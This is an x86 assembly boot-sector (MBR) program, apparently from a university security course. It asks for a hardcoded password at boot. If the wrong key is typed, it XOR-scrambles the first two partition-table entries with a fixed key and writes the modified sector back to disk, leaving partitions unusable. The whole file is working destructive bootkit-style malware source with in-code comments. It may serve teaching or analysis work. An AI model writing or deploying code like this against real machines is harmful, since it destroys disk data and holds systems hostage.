;
; This code attempts to remove an entry from the partition
; table. The entry will be zeroed out.
;
; Written by: Your boss from COMP6845
;

[bits 16]
[org 0x1000]

%define SECTOR_READ_ADDR        0x1500
%define STACK_ADDR              0x600
%define PARTITION_OFFSET        0x1be
%define PARTITION_ENTRY_SIZE    0x10

_start:
    cli
    xor ax, ax

    mov ds, ax                  ; Set data segment to 0
    mov es, ax                  ; extra segment = 0
    mov ss, ax                  ; stack segment = 0

    mov sp, STACK_ADDR

    mov di, 0x1000              ; new memory addr for this MBR
    mov si, 0x7c00              ; where this MBR is currently at
    mov cx, 0x0100              ; size of the MBR (0x100 = 256) but we are writing words

    rep movsw                   ; copy the mbr to 0x1000
    jmp 0:_wipe_part            ; jumps to new address starting at 0x600

_wipe_part:
    mov [drive_type], dl        ; save the drive type that BIOS gave us

    call _reset_disk

    mov si, reading_disk_msg
    call _print_str

    ; read the sector containing the mbr into memory
    mov al, 0x1                 ; num of sectors to read
    mov ch, 0x0                 ; cylinder to read from
    mov dh, 0x0                 ; head to read from
    mov cl, 0x1                 ; sector to read from
    mov bx, SECTOR_READ_ADDR    ; where to store the sector we read
    call _read_sector
    
    push dx
    
    jmp _check_input
    
_encrypt:
    mov si, wrong            ; print message for encryption
    call _print_str
    
    ; xor the entry/entries
    lea di, [SECTOR_READ_ADDR]  ; get MBR start address
    add di, PARTITION_OFFSET    ; offset to first partition entry
    xor bx, bx                  ; use bx as counter
_xor_loop:
    cmp bx, 0x20                ; loop 32 times ~ 2 entries
    jge _xor_end
    
    ; mod the counter to repeat xor string
    xor dx, dx                  ; dx contains remainder
    mov ax, bx                  ; load current counter/index to ax
    mov cx, 0x10                ; length of xor string
    div cx                      ; do ax / cx
                                ; dx contains remainder, ax contains quotient
    mov cx, bx                  ; save current counter/index
    mov bx, dx                  ; use remainder to index into xor string
    mov al, byte [xor_string + bx]      ; can only use bx to index [] in asm
    mov bx, cx
    mov cl, byte [di + bx]      ; use current counter to index to entry/memory
    xor al, cl
    mov [di + bx], al
    
    inc bx
    jmp _xor_loop
_xor_end:
    xor ax, ax                  ; null out registers else error

    pop dx
    ; write the local copy of the partition onto the disk
    mov al, 0x1                 ; num of sectors to read
    mov ch, 0x0                 ; cylinder to read from
    mov dh, 0x0                 ; head to read from
    mov cl, 0x1                 ; sector to read from
    mov bx, SECTOR_READ_ADDR    ; where to store the sector we read
    call _write_sector

    hlt

_reset_disk:
    mov ah, 0x0
    int 0x13                    ; reset the disk
    jc _reset_error
    ret

_read_sector:
    mov ah, 0x2                 ; code for specifying reading sectors
    int 0x13
    jc _read_error
    ret

_write_sector:
    mov ah, 0x3
    int 0x13
    jc _write_error
    ret

_write_error:
    mov si, write_error_msg
    call _print_str
    hlt

_reset_error:
    mov si, reset_disk_error_msg
    call _print_str
    hlt

_read_error:
    mov si, read_disk_error_msg
    call _print_str
    hlt

_print_str:
    lodsb
    or al, al           ; did we reach a null byte?
    jz _print_end
    mov ah, 0xe
    int 0x10
    jmp _print_str

_print_end:
    ret

_check_input:
    xor bx, bx
loop0:  
	cli
	mov ax, 0              
    int 16h                ; get_key interrupt 
	
	mov dl, al              ; get_key places next keypress into al
	mov [buf], dl	    	; move char entered by user into buf
	
	mov cl, byte [secret + bx]
	or  cl, cl
	jz  _passed
	xor dl, cl
	jnz _encrypt
	inc bx
	xor cx, cx
	 
	mov si, buf             ; SI now points to our message
	mov ah, 0x0E            ; Indicate BIOS we're going to print chars
loop:
    lodsb                   ; Loads SI into AL and increments SI [next char]
	or al, al               ; Checks if the end of the string
	jz loop0                ; Jump back to the main loop
	int 0x10                ; Otherwise, call interrupt for printing the char
	jmp loop                ; Next iteration of the loop

_passed:
    mov si, right
    call _print_str
    jmp _xor_end

buf:                        db 0           ; 1-byte buffer to write keypresses to
                            db 0x00
secret:                     db "l1st3n t0 ur h34rt", 0x00
reading_disk_msg:           db "Reading sector 1 of disk!", 0x0a
                            db 0x00
reset_disk_error_msg:       db "Error resetting disk.", 0x0a
                            db 0x00
read_disk_error_msg:        db "Error reading sector.", 0x0a
                            db 0x00
write_error_msg:            db "Error writing sector.", 0x0a
                            db 0x00
xor_string:                 db "dafuq do u want?", 0x00
wrong:                      db "RIP my friend!", 0x0a
                            db 0x00
right:                      db "Congratz!", 0x0a
                            db 0x00
drive_type:                 dw 0x0000

; fill the mbr will null bytes to acquire the 512 byte size
times 0x1be - ($ - $$) db 0x00

; partition table
PART_1: times 16 db 0xaa
PART_2: times 16 db 0xbb
PART_3: times 16 db 0xcc
PART_4: times 16 db 0xdd

; boot signature
dw 0xaa55
